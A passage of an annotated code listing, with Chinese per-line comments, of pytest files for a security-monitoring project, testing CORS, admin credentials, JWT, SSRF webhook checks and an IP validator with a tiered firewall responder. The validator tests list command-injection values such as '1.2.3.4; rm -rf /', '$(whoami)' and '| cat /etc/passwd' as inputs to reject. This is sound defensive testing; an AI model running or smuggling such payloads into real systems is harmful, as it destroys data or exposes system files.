| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 函数定义：声明 `test_production_get_config_rejects_cors_wildcard` 的输入、处理逻辑和返回结果。 | `def test_production_get_config_rejects_cors_wildcard():` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code = (` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import os, sys\n"` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['FLASK_ENV']='production'\n"` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['DATABASE_URL']='sqlite:///:memory:'\n"` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['SECRET_KEY']='a' * 40\n"` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ADMIN_PASSWORD_HASH']='pbkdf2:sha256:1$test$somethinginvalid'\n"` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['REDIS_PASSWORD']='redis-secret'\n"` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ALLOWED_ORIGINS']='https://a.com,*'\n"` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import importlib\n"` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import config.config as cc\n"` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "importlib.reload(cc)\n"` |
| 130 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "try:\n"` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    cc.get_config()\n"` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "except RuntimeError as e:\n"` |
| 133 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    if 'CORS' in str(e) or '通配符' in str(e):\n"` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "        sys.exit(0)\n"` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    raise\n"` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "sys.exit(1)\n"` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = _run_fresh_config_snippet(code, {})` |
| 139 | 断言：验证测试或运行时假设是否成立。 | `    assert p.returncode == 0, p.stderr + p.stdout` |
| 140 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 函数定义：声明 `test_verify_admin_rejects_production_without_hash` 的输入、处理逻辑和返回结果。 | `def test_verify_admin_rejects_production_without_hash(monkeypatch):` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "production")` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.delenv("ADMIN_PASSWORD_HASH", raising=False)` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 147 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.auth import verify_admin_credentials` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 断言：验证测试或运行时假设是否成立。 | `    assert verify_admin_credentials("admin", "changeme") is False` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 函数定义：声明 `test_protected_api_returns_401_without_jwt` 的输入、处理逻辑和返回结果。 | `def test_protected_api_returns_401_without_jwt(monkeypatch, tmp_path):` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("AUDIT_INTEGRITY_PATROL", "false")` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "harden.db"` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 157 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 162 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 163 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.get("/api/stats")` |
| 167 | 断言：验证测试或运行时假设是否成立。 | `    assert r.status_code == 401` |
| 168 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 169 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 170 | 函数定义：声明 `test_cors_rejects_disallowed_origin` 的输入、处理逻辑和返回结果。 | `def test_cors_rejects_disallowed_origin(monkeypatch, tmp_path):` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 172 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("AUDIT_INTEGRITY_PATROL", "false")` |
| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ALLOWED_ORIGINS", "https://trusted.example")` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "cors.db"` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 179 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 180 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.options(` |
| 186 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "/api/health",` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        headers={` |
| 188 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "Origin": "https://evil.example",` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "Access-Control-Request-Method": "GET",` |
| 190 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 191 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aco = r.headers.get("Access-Control-Allow-Origin")` |
| 193 | 断言：验证测试或运行时假设是否成立。 | `    assert aco != "https://evil.example"` |
| 194 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 195 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 196 | 函数定义：声明 `test_webhook_metadata_hostname_rejected` 的输入、处理逻辑和返回结果。 | `def test_webhook_metadata_hostname_rejected():` |
| 197 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.response.webhook_url import check_webhook_url_safe` |
| 198 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = check_webhook_url_safe("https://metadata.google.internal/computeMetadata/v1/")` |
| 200 | 断言：验证测试或运行时假设是否成立。 | `    assert r.ok is False` |
| 201 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 202 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 203 | 函数定义：声明 `test_redis_password_used_by_client_constructor` 的输入、处理逻辑和返回结果。 | `def test_redis_password_used_by_client_constructor():` |
| 204 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.redis_client import RedisClient` |
| 205 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    c = RedisClient(host="127.0.0.1", port=63999, password="secret-redis-pass")` |
| 207 | 断言：验证测试或运行时假设是否成立。 | `    assert c.password == "secret-redis-pass"` |

## `tests/test_responder.py`

- 类型：测试
- 行数：398

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Phase 5 防护响应层 - 单元测试` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §6 / Phase 5 提示词验收标准` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `运行方式：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    cd ai-security-guardian` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m pytest tests/test_responder.py -v` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `测试覆盖：` |
| 10 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - validate_ip()：合法 / 非法 / 命令注入 payload / 空值 / 非字符串` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - SecurityResponder 分级响应：normal / low / medium / high / critical` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - dry_run 模式：不实际调用 subprocess` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - 命令注入防御：恶意 IP 不会被传递到 subprocess.run()` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 重复封禁：同一 IP 只封一次` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 解封：从 _banned_ips 中移除记录` |
| 16 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 17 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 20 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 21 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import subprocess` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta` |
| 24 | 导入对象：从指定模块引入类、函数或常量。 | `from unittest.mock import MagicMock, patch` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 29 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult  # noqa: E402` |
| 33 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.responder import SecurityResponder, validate_ip  # noqa: E402` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 37 | 注释：解释下面或当前这段代码的设计意图。 | `# 辅助：快速构造 DetectionResult` |
| 38 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 39 | 函数定义：声明 `_make_result` 的输入、处理逻辑和返回结果。 | `def _make_result(` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_level: str,` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    source_ip: str = "10.0.0.1",` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_type: str = "web_attack",` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    confidence: float = 0.9,` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    details: str = "test",` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> DetectionResult:` |
| 46 | 返回结果：把处理后的值交回调用方。 | `    return DetectionResult(` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type=threat_type,` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level=threat_level,` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence=confidence,` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details=details,` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip=source_ip,` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 56 | 注释：解释下面或当前这段代码的设计意图。 | `# 1. IP 地址严格校验` |
| 57 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 58 | 类定义：声明 `TestValidateIP`，封装相关状态与行为。 | `class TestValidateIP:` |
| 59 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证 validate_ip() 对各种输入的处理。"""` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize(` |
| 62 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ip",` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `        [` |
| 64 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "192.168.1.1",` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "10.0.0.1",` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "0.0.0.0",` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "255.255.255.255",` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "127.0.0.1",` |
| 69 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "8.8.8.8",` |
| 70 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "  192.168.1.1  ",  # 前后空格需能正常 strip` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ],` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 73 | 函数定义：声明 `test_legal_ips_pass` 的输入、处理逻辑和返回结果。 | `    def test_legal_ips_pass(self, ip):` |
| 74 | 断言：验证测试或运行时假设是否成立。 | `        assert validate_ip(ip) is True` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.mark.parametrize(` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ip",` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `        [` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "256.1.1.1",` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "999.1.1.1",` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.1.1",` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.1.1.1.1",` |
| 83 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "abc.def.ghi.jkl",` |
| 84 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "",` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "   ",` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `            None,` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `            123,` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ["1.2.3.4"],` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"ip": "1.2.3.4"},` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.2.3.4; rm -rf /",` |
| 91 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.2.3.4 \| cat /etc/passwd",` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `            "$(whoami)",` |
| 93 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "\`cat /etc/passwd\`",` |
| 94 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.2.3.4 && reboot",` |
| 95 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "1.2.3.4;iptables -F",` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `            "<script>alert(1)</script>",` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ],` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 99 | 函数定义：声明 `test_illegal_ips_rejected` 的输入、处理逻辑和返回结果。 | `    def test_illegal_ips_rejected(self, ip):` |
| 100 | 断言：验证测试或运行时假设是否成立。 | `        assert validate_ip(ip) is False` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 104 | 注释：解释下面或当前这段代码的设计意图。 | `# 2. 分级响应策略` |
| 105 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 106 | 类定义：声明 `TestRespondLevels`，封装相关状态与行为。 | `class TestRespondLevels:` |
| 107 | 文档字符串：说明当前模块、类或函数的职责。 | `    """验证 respond() 对不同威胁等级的执行路径。"""` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 函数定义：声明 `test_normal_no_action` 的输入、处理逻辑和返回结果。 | `    def test_normal_no_action(self):` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 111 | 上下文管理：自动管理资源打开与释放。 | `        with patch.object(responder, "_log_only") as log, \` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_notify") as alert, \` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_ban_for_level") as ban, \` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_isolate_for_critical") as iso:` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `                DetectionResult(` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_type="normal",` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_level="low",` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    confidence=1.0,` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    details="ok",` |
| 121 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `            log.assert_not_called()` |
| 124 | 函数调用：执行已有函数/方法完成当前步骤。 | `            alert.assert_not_called()` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ban.assert_not_called()` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `            iso.assert_not_called()` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 函数定义：声明 `test_low_log_only` 的输入、处理逻辑和返回结果。 | `    def test_low_log_only(self):` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 130 | 上下文管理：自动管理资源打开与释放。 | `        with patch.object(responder, "_log_only") as log, \` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_notify") as alert, \` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_ban_for_level") as ban, \` |
| 133 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_isolate_for_critical") as iso:` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(_make_result("low"))` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `            log.assert_called_once()` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `            alert.assert_not_called()` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ban.assert_not_called()` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `            iso.assert_not_called()` |
| 139 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 140 | 函数定义：声明 `test_medium_log_and_alert` 的输入、处理逻辑和返回结果。 | `    def test_medium_log_and_alert(self):` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 142 | 上下文管理：自动管理资源打开与释放。 | `        with patch.object(responder, "_log_only") as log, \` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_notify") as alert, \` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_ban_for_level") as ban, \` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_isolate_for_critical") as iso:` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(_make_result("medium"))` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `            log.assert_called_once()` |
| 148 | 函数调用：执行已有函数/方法完成当前步骤。 | `            alert.assert_called_once()` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ban.assert_not_called()` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `            iso.assert_not_called()` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 函数定义：声明 `test_high_log_alert_ban` 的输入、处理逻辑和返回结果。 | `    def test_high_log_alert_ban(self):` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 154 | 上下文管理：自动管理资源打开与释放。 | `        with patch.object(responder, "_log_only") as log, \` |
| 155 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_notify") as alert, \` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_ban_for_level") as ban, \` |
| 157 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_isolate_for_critical") as iso:` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(_make_result("high"))` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `            log.assert_called_once()` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `            alert.assert_called_once()` |
| 161 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ban.assert_called_once()` |
| 162 | 注释：解释下面或当前这段代码的设计意图。 | `            # 封禁时长应为 1 小时` |
| 163 | 代码语句：参与当前文件的业务流程或数据处理。 | `            _args, kwargs = ban.call_args` |
| 164 | 断言：验证测试或运行时假设是否成立。 | `            assert kwargs.get("duration") == timedelta(hours=1)` |
| 165 | 函数调用：执行已有函数/方法完成当前步骤。 | `            iso.assert_not_called()` |
| 166 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 167 | 函数定义：声明 `test_critical_log_alert_ban_isolate` 的输入、处理逻辑和返回结果。 | `    def test_critical_log_alert_ban_isolate(self):` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 169 | 上下文管理：自动管理资源打开与释放。 | `        with patch.object(responder, "_log_only") as log, \` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_notify") as alert, \` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_ban_for_level") as ban, \` |
| 172 | 函数调用：执行已有函数/方法完成当前步骤。 | `                patch.object(responder, "_isolate_for_critical") as iso:` |
| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.respond(_make_result("critical"))` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `            log.assert_called_once()` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `            alert.assert_called_once()` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ban.assert_called_once()` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `            iso.assert_called_once()` |
| 178 | 注释：解释下面或当前这段代码的设计意图。 | `            # critical 封禁时长应为 1 天` |
| 179 | 代码语句：参与当前文件的业务流程或数据处理。 | `            _args, kwargs = ban.call_args` |
| 180 | 断言：验证测试或运行时假设是否成立。 | `            assert kwargs.get("duration") == timedelta(days=1)` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 183 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 184 | 注释：解释下面或当前这段代码的设计意图。 | `# 3. dry_run 模式：不实际执行 subprocess` |
| 185 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 186 | 类定义：声明 `TestDryRun`，封装相关状态与行为。 | `class TestDryRun:` |
| 187 | 文档字符串：说明当前模块、类或函数的职责。 | `    """dry_run=True 时，防火墙操作只打印日志，不调用 subprocess。"""` |
| 188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 189 | 函数定义：声明 `test_ban_ip_dry_run_no_subprocess` 的输入、处理逻辑和返回结果。 | `    def test_ban_ip_dry_run_no_subprocess(self):` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 191 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 192 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_not_called()` |
| 194 | 断言：验证测试或运行时假设是否成立。 | `        assert responder.is_banned("10.0.0.1")` |
| 195 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 196 | 函数定义：声明 `test_unban_ip_dry_run_no_subprocess` 的输入、处理逻辑和返回结果。 | `    def test_unban_ip_dry_run_no_subprocess(self):` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        responder = SecurityResponder(dry_run=True)` |
| 198 | 函数调用：执行已有函数/方法完成当前步骤。 | `        responder._ban_ip("10.0.0.1", duration=timedelta(hours=1))` |
| 199 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.response.firewall.subprocess.run") as mock_run:` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `            responder.unban_ip("10.0.0.1")` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mock_run.assert_not_called()` |
| 202 | 断言：验证测试或运行时假设是否成立。 | `        assert not responder.is_banned("10.0.0.1")` |
| 203 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 204 | 函数定义：声明 `test_non_dry_run_invokes_subprocess` 的输入、处理逻辑和返回结果。 | `    def test_non_dry_run_invokes_subprocess(self):` |
